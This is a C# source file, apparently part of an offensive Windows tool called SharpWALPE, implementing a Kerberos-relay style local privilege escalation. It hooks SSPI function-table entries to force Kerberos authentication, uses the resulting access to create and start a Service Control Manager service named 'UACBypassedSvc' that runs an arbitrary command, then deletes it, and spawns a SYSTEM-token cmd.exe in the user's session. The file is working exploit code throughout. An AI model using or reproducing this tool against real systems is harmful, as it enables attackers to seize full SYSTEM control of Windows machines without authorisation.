using Kerberos.NET.Crypto;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace SharpWALPE
{
    public class KrbSCM
    {
        public static string serviceCommand = "";
        public static string serviceName = "UACBypassedSvc";

        [STAThread]
        public static int AcquireCredentialsHandleHook(string pszPrincipal, StringBuilder pszPackage, int fCredentialUse, IntPtr PAuthenticationID, IntPtr pAuthData, IntPtr pGetKeyFn, IntPtr pvGetKeyArgument, ref SECURITY_HANDLE phCredential, IntPtr ptsExpiry)
        {
            Console.WriteLine($"[*] AcquireCredentialsHandleHook called for package {pszPackage}\n[*] Changing to Kerberos package");
            pszPackage = new StringBuilder("Kerberos");
            return AcquireCredentialsHandle(pszPrincipal, pszPackage.ToString(), fCredentialUse, PAuthenticationID, pAuthData, pGetKeyFn, pvGetKeyArgument, ref phCredential, ptsExpiry);
        }

        [STAThread]
        public static int InitializeSecurityContextHook(ref SECURITY_HANDLE phCredential, ref SECURITY_HANDLE phContext, string pszTargetName, int fContextReq, int Reserved1, int TargetDataRep, ref SecBufferDesc pInput, int Reserved2, out SECURITY_HANDLE phNewContext, out SecBufferDesc pOutput, out int pfContextAttr, out SECURITY_HANDLE ptsExpiry)
        {
            Console.WriteLine($"[*] InitializeSecurityContextHook called for target {pszTargetName}");
            int status = InitializeSecurityContext(ref phCredential, ref phContext, $"HOST/{Environment.MachineName}", fContextReq, Reserved1, TargetDataRep, ref pInput, Reserved2, out phNewContext, out pOutput, out pfContextAttr, out ptsExpiry);
            Win32Exception ex = new Win32Exception(status);
            Console.WriteLine($"[*] InitializeSecurityContext {ex.Message} (code: 0x{status:X8})");
            return status;
        }

        public static int Execute(string command, string svcname = null, bool cleanup = true)
        {
            serviceCommand = command;
            int err = 0;
            Win32Exception ex = null;

            if (Program.verbosity) Console.WriteLine("[*] Action: KrbSCM");

            // Initialize SecurityInterface
            Console.WriteLine("[*] Using ticket to connect to Service Manger");
            IntPtr functionTable = InitSecurityInterface();
            SecurityFunctionTable table = (SecurityFunctionTable)Marshal.PtrToStructure(functionTable, typeof(SecurityFunctionTable));

            // Hook AcquireCredentialsHandle function
            FuncAcquireCredentialsHandle DelegAcquireCredentialsHandle = new FuncAcquireCredentialsHandle(AcquireCredentialsHandleHook);
            byte[] bAcquireCredentialsHandle = BitConverter.GetBytes(Marshal.GetFunctionPointerForDelegate(DelegAcquireCredentialsHandle).ToInt64());
            int oAcquireCredentialsHandle = Marshal.OffsetOf(typeof(SecurityFunctionTable), "AcquireCredentialsHandle").ToInt32();
            Marshal.Copy(bAcquireCredentialsHandle, 0, functionTable + oAcquireCredentialsHandle, bAcquireCredentialsHandle.Length);

            // Hook InitializeSecurityContext function
            FuncInitializeSecurityContext DelegInitializeSecurityContext = new FuncInitializeSecurityContext(InitializeSecurityContextHook);
            byte[] bInitializeSecurityContext = BitConverter.GetBytes(Marshal.GetFunctionPointerForDelegate(DelegInitializeSecurityContext).ToInt64());
            int oInitializeSecurityContext = Marshal.OffsetOf(typeof(SecurityFunctionTable), "InitializeSecurityContext").ToInt32();
            Marshal.Copy(bInitializeSecurityContext, 0, functionTable + oInitializeSecurityContext, bInitializeSecurityContext.Length);

            if (!String.IsNullOrEmpty(svcname))
            {
                serviceName = svcname;
            }

            if (String.IsNullOrEmpty(serviceCommand))
            {
                string exe = System.Reflection.Assembly.GetExecutingAssembly().Location;
                int session_id = System.Diagnostics.Process.GetCurrentProcess().SessionId;
                serviceCommand = $"\"{exe}\" system {session_id}\n";
            }

            IntPtr hScm = OpenSCManager("127.0.0.1", null, ScmAccessRights.Connect | ScmAccessRights.CreateService);

            if (hScm == IntPtr.Zero)
            {
                err = Marshal.GetLastWin32Error();
                ex = new Win32Exception(err);
                Console.WriteLine($"[-] Error opening SCM: {ex.Message} (code: 0x{err:X8})");
                return err;
            }

            IntPtr hService = CreateService(hScm, serviceName, null, ServiceAccessRights.AllAccess, ServiceType.SERVICE_WIN32_OWN_PROCESS, ServiceBootFlag.DemandStart, ServiceError.Ignore, serviceCommand, null, IntPtr.Zero, null, null, null);

            if (hService == IntPtr.Zero)
            {
                err = Marshal.GetLastWin32Error();
                ex = new Win32Exception(err);
                if (err != 1073)
                {
                    Console.WriteLine($"[-] Error creating service: {ex.Message} (code: 0x{err:X8})");
                    return err;
                }
                else
                {
                    hService = OpenService(hScm, serviceName, ServiceAccessRights.AllAccess);
                    if (hService == IntPtr.Zero)
                    {
                        err = Marshal.GetLastWin32Error();
                        ex = new Win32Exception(err);
                        Console.WriteLine($"[-] Error opening {serviceName} Service: {ex.Message} (code: 0x{err:X8})");
                        return err;
                    }
                }
            }
            Console.WriteLine($"[*] {serviceName} Service created");

            StartService(hService, 0, null);

            err = Marshal.GetLastWin32Error();
            if (!(err == 0 || err == 1053)) // not (NO_ERROR or ERROR_SERVICE_REQUEST_TIMEOUT)
            {
                ex = new Win32Exception(err);
                Console.WriteLine($"[-] Error starting service: {ex.Message} (code: 0x{err:X8})");
                return err;
            }
            else err = 0;

            Console.WriteLine($"[*] {serviceName} Service started");

            System.Threading.Thread.Sleep(1000);

            if (cleanup)
            {
                DeleteService(hService);
                ex = new Win32Exception(err);
                if (!(err == 0 || err == 1053)) // not (NO_ERROR or ERROR_SERVICE_REQUEST_TIMEOUT)
                {
                    err = Marshal.GetLastWin32Error();
                    Console.WriteLine($"[-] Error deleting service: {ex.Message} (code: 0x{err:X8})");
                    return err;
                }
                else err = 0;
                Console.WriteLine("[*] Clean-up done");
            }
            return err;
        }

        public static void RunSystemProcess(int session_id)
        {
            IntPtr hToken = IntPtr.Zero;
            if (!OpenProcessToken((IntPtr)(-1), TOKEN_DUPLICATE, out hToken))
            {
                Console.WriteLine($"[-] Error opening process token: {Marshal.GetLastWin32Error()}");
                return;
            }

            IntPtr hPrimaryToken = IntPtr.Zero;
            SECURITY_ATTRIBUTES s = new SECURITY_ATTRIBUTES();
            if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, ref s, SecurityImpersonationLevel.SecurityAnonymous, TokenType.TokenPrimary, ref hPrimaryToken))
            {
                Console.WriteLine($"[-] Error duplicating process token: {Marshal.GetLastWin32Error()}");
                return;
            }

            if (!SetTokenInformation(hPrimaryToken, TokenInformationClass.TokenSessionId, ref session_id, sizeof(UInt32)))
            {
                Console.WriteLine($"[-] Error setting session ID: {Marshal.GetLastWin32Error()}");
                return;
            }
            STARTUPINFO start_info = new STARTUPINFO();
            start_info.cb = Marshal.SizeOf(start_info);
            start_info.lpDesktop = "WinSta0\\Default";
            start_info.wShowWindow = 5;

            string cmdline = "cmd.exe";
            PROCESS_INFORMATION proc_info = new PROCESS_INFORMATION();
            if (!CreateProcessAsUser(hPrimaryToken, null, cmdline, ref s, ref s, false, ProcessCreationFlags.CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref start_info, out proc_info))
            {
                Console.WriteLine($"[-] Error creating process: {Marshal.GetLastWin32Error()}");
                return;
            }

            CloseHandle(proc_info.hProcess);
            CloseHandle(proc_info.hThread);

            Console.WriteLine($"[*] Created process ID: {proc_info.dwProcessId}");

        }


        #region Native

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_HANDLE
        {
            public IntPtr LowPart;
            public IntPtr HighPart;

            public SECURITY_HANDLE(int dummy)
            {
                LowPart = HighPart = IntPtr.Zero;
            }
        };

        [StructLayout(LayoutKind.Sequential)]
        public struct SecBufferDesc
        {
            public int ulVersion;
            public int cBuffers;
            public IntPtr pBuffer;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct SecurityFunctionTable
        {
            /// <summary>Version number of the table.</summary>
            public uint dwVersion;

            /// <summary>Pointer to the EnumerateSecurityPackages function.</summary>
            public IntPtr EnumerateSecurityPackages;

            /// <summary>Pointer to the QueryCredentialsAttributes function.</summary>
            public IntPtr QueryCredentialsAttributes;

            /// <summary>Pointer to the AcquireCredentialsHandle function.</summary>
            public IntPtr AcquireCredentialsHandle;

            /// <summary>Pointer to the FreeCredentialsHandle function.</summary>
            public IntPtr FreeCredentialHandl;

            /// <summary>Reserved for future use.</summary>
            public IntPtr Reserved1;

            /// <summary>Pointer to the InitializeSecurityContext (General) function.</summary>
            public IntPtr InitializeSecurityContext;

            /// <summary>Pointer to the AcceptSecurityContext (General) function.</summary>
            public IntPtr AcceptSecurityContex;

            /// <summary>Pointer to the CompleteAuthToken function.</summary>
            public IntPtr CompleteAuthToke;

            /// <summary>Pointer to the DeleteSecurityContext function.</summary>
            public IntPtr DeleteSecurityContex;

            /// <summary>Pointer to the ApplyControlToken function.</summary>
            public IntPtr ApplyControlToke;

            /// <summary>Pointer to the QueryContextAttributes (General) function.</summary>
            public IntPtr QueryContextAttributes;

            /// <summary>Pointer to the ImpersonateSecurityContext function.</summary>
            public IntPtr ImpersonateSecurityContex;

            /// <summary>Pointer to the RevertSecurityContext function.</summary>
            public IntPtr RevertSecurityContex;

            /// <summary>Pointer to the MakeSignature function.</summary>
            public IntPtr MakeSignatur;

            /// <summary>Pointer to the VerifySignature function.</summary>
            public IntPtr VerifySignatur;

            /// <summary>Pointer to the FreeContextBuffer function.</summary>
            public IntPtr FreeContextBuffe;

            /// <summary>Pointer to the QuerySecurityPackageInfo function.</summary>
            public IntPtr QuerySecurityPackageInfo;

            /// <summary>Reserved for future use.</summary>
            public IntPtr Reserved2;

            /// <summary>Reserved for future use.</summary>
            public IntPtr Reserved3;

            /// <summary>Pointer to the ExportSecurityContext function.</summary>
            public IntPtr ExportSecurityContex;

            /// <summary>Pointer to the ImportSecurityContext function.</summary>
            public IntPtr ImportSecurityContext;

            /// <summary>Pointer to the AddCredential function.</summary>
            public IntPtr AddCredentials;

            /// <summary>Reserved for future use.</summary>
            public IntPtr Reserved4;

            /// <summary>Pointer to the QuerySecurityContextToken function.</summary>
            public IntPtr QuerySecurityContextToke;

            /// <summary>Pointer to the EncryptMessage (General) function.</summary>
            public IntPtr EncryptMessag;

            /// <summary>Pointer to the DecryptMessage (General) function.</summary>
            public IntPtr DecryptMessag;

            /// <summary>Pointer to the SetContextAttributes function.</summary>
            public IntPtr SetContextAttributes;

            /// <summary>Pointer to the SetCredentialsAttributes function.</summary>
            public IntPtr SetCredentialsAttributes;

            /// <summary>Pointer to the ChangeAccountPassword function.</summary>
            public IntPtr ChangeAccountPassword;

            /// <summary>Pointer to the AddCredential function.</summary>
            public IntPtr Reserved5;

            /// <summary>Pointer to the QueryContextAttributesEx function.</summary>
            public IntPtr QueryContextAttributesEx;

            /// <summary>Pointer to the QueryCredentialsAttributesEx function.</summary>
            public IntPtr QueryCredentialsAttributesEx;
        }

        [Flags]
        public enum TokenType
        {
            TokenPrimary = 1,
            TokenImpersonation
        }

        [Flags]
        public enum SecurityImpersonationLevel
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }

        [Flags]
        public enum TokenInformationClass
        {
            TokenUser = 1,
            TokenGroups,
            TokenPrivileges,
            TokenOwner,
            TokenPrimaryGroup,
            TokenDefaultDacl,
            TokenSource,
            TokenType,
            TokenImpersonationLevel,
            TokenStatistics,
            TokenRestrictedSids,
            TokenSessionId,
            TokenGroupsAndPrivileges,
            TokenSessionReference,
            TokenSandBoxInert,
            TokenAuditPolicy,
            TokenOrigin,
            TokenElevationType,
            TokenLinkedToken,
            TokenElevation,
            TokenHasRestrictions,
            TokenAccessInformation,
            TokenVirtualizationAllowed,
            TokenVirtualizationEnabled,
            TokenIntegrityLevel,
            TokenUIAccess,
            TokenMandatoryPolicy,
            TokenLogonSid,
            TokenIsAppContainer,
            TokenCapabilities,
            TokenAppContainerSid,
            TokenAppContainerNumber,
            TokenUserClaimAttributes,
            TokenDeviceClaimAttributes,
            TokenRestrictedUserClaimAttributes,
            TokenRestrictedDeviceClaimAttributes,
            TokenDeviceGroups,
            TokenRestrictedDeviceGroups,
            TokenSecurityAttributes,
            TokenIsRestricted,
            TokenProcessTrustLevel,
            TokenPrivateNameSpace,
            TokenSingletonAttributes,
            TokenBnoIsolation,
            TokenChildProcessFlags,
            TokenIsLessPrivilegedAppContainer,
            TokenIsSandboxed,
            TokenIsAppSilo,
            MaxTokenInfoClass
        }

        [Flags]
        public enum ProcessCreationFlags : uint
        {
            ZERO_FLAG = 0x00000000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NEW_CONSOLE = 0x00000010,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_NO_WINDOW = 0x08000000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_SEPARATE_WOW_VDM = 0x00001000,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_SUSPENDED = 0x00000004,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            DEBUG_PROCESS = 0x00000001,
            DETACHED_PROCESS = 0x00000008,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            INHERIT_PARENT_AFFINITY = 0x00010000
        }

        [Flags]
        public enum ServiceType : uint
        {
            SERVICE_KERNEL_DRIVER = 0x00000001,
            SERVICE_FILE_SYSTEM_DRIVER = 0x00000002,
            SERVICE_ADAPTER = 0x00000004,
            SERVICE_RECOGNIZER_DRIVER = 0x00000008,
            SERVICE_WIN32_OWN_PROCESS = 0x00000010,
            SERVICE_WIN32_SHARE_PROCESS = 0x00000020,
        }

        [Flags]
        public enum ScmAccessRights
        {
            Connect = 0x0001,
            CreateService = 0x0002,
            EnumerateService = 0x0004,
            Lock = 0x0008,
            QueryLockStatus = 0x0010,
            ModifyBootConfig = 0x0020,
            StandardRightsRequired = 0xF0000,
            AllAccess = (StandardRightsRequired | Connect | CreateService |
                         EnumerateService | Lock | QueryLockStatus | ModifyBootConfig)
        }

        [Flags]
        public enum ServiceAccessRights
        {
            QueryConfig = 0x1,
            ChangeConfig = 0x2,
            QueryStatus = 0x4,
            EnumerateDependants = 0x8,
            Start = 0x10,
            Stop = 0x20,
            PauseContinue = 0x40,
            Interrogate = 0x80,
            UserDefinedControl = 0x100,
            Delete = 0x00010000,
            StandardRightsRequired = 0xF0000,
            AllAccess = (StandardRightsRequired | QueryConfig | ChangeConfig |
                         QueryStatus | EnumerateDependants | Start | Stop | PauseContinue |
                         Interrogate | UserDefinedControl)
        }

        public enum ServiceBootFlag
        {
            Start = 0x00000000,
            SystemStart = 0x00000001,
            AutoStart = 0x00000002,
            DemandStart = 0x00000003,
            Disabled = 0x00000004
        }

        public enum ServiceError
        {
            Ignore = 0x00000000,
            Normal = 0x00000001,
            Severe = 0x00000002,
            Critical = 0x00000003
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SECURITY_ATTRIBUTES
        {
            public int Length;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFO
        {
            public int cb;
            public String lpReserved;
            public String lpDesktop;
            public String lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr InitSecurityInterface();

        [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int AcquireCredentialsHandle(string pszPrincipal, string pszPackage, int fCredentialUse, IntPtr PAuthenticationID, IntPtr pAuthData, IntPtr pGetKeyFn, IntPtr pvGetKeyArgument, ref SECURITY_HANDLE phCredential, IntPtr ptsExpiry);

        [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int InitializeSecurityContext(ref SECURITY_HANDLE phCredential, ref SECURITY_HANDLE phContext, string pszTargetName, int fContextReq, int Reserved1, int TargetDataRep, ref SecBufferDesc pInput, int Reserved2, out SECURITY_HANDLE phNewContext, out SecBufferDesc pOutput, out int pfContextAttr, out SECURITY_HANDLE ptsExpiry);

        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, ScmAccessRights dwDesiredAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, ServiceAccessRights dwDesiredAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern IntPtr CreateService(IntPtr hSCManager, string lpServiceName, string lpDisplayName, ServiceAccessRights dwDesiredAccess, ServiceType dwServiceType, ServiceBootFlag dwStartType, ServiceError dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, IntPtr lpdwTagId, string lpDependencies, string lp, string lpPassword);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool DeleteService(IntPtr hService);

        [DllImport("advapi32.dll", EntryPoint = "OpenProcessToken", SetLastError = true, ExactSpelling = true)]
        internal static extern bool OpenProcessToken(IntPtr ProcessHandle, uint dwDesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", EntryPoint = "CreateProcessAsUser", SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
        private static extern bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment, String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("advapi32.dll", EntryPoint = "DuplicateTokenEx")]
        private static extern bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpThreadAttributes, SecurityImpersonationLevel ImpersonationLevel, TokenType TokenType, ref IntPtr DuplicateTokenHandle);

        [DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern bool CloseHandle(IntPtr handle);

        [DllImport("advapi32.dll")]
        public static extern bool SetTokenInformation(IntPtr TokenHandle, TokenInformationClass TokenInformationClass, ref int TokenInformation, int TokenInformationLength);

        public delegate int FuncAcquireCredentialsHandle(string pszPrincipal, StringBuilder pszPackage, int fCredentialUse, IntPtr PAuthenticationID, IntPtr pAuthData, IntPtr pGetKeyFn, IntPtr pvGetKeyArgument, ref SECURITY_HANDLE phCredential, IntPtr ptsExpiry);
        public delegate int FuncInitializeSecurityContext(ref SECURITY_HANDLE phCredential, ref SECURITY_HANDLE phContext, string pszTargetName, int fContextReq, int Reserved1, int TargetDataRep, ref SecBufferDesc pInput, int Reserved2, out SECURITY_HANDLE phNewContext, out SecBufferDesc pOutput, out int pfContextAttr, out SECURITY_HANDLE ptsExpiry);

        public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        public const UInt32 STANDARD_RIGHTS_READ = 0x00020000;
        public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
        public const UInt32 TOKEN_DUPLICATE = 0x0002;
        public const UInt32 TOKEN_IMPERSONATE = 0x0004;
        public const UInt32 TOKEN_QUERY = 0x0008;
        public const UInt32 TOKEN_QUERY_SOURCE = 0x0010;
        public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
        public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040;
        public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080;
        public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100;
        public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
        public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
            TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
            TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
            TOKEN_ADJUST_SESSIONID);

        #endregion


    }
}
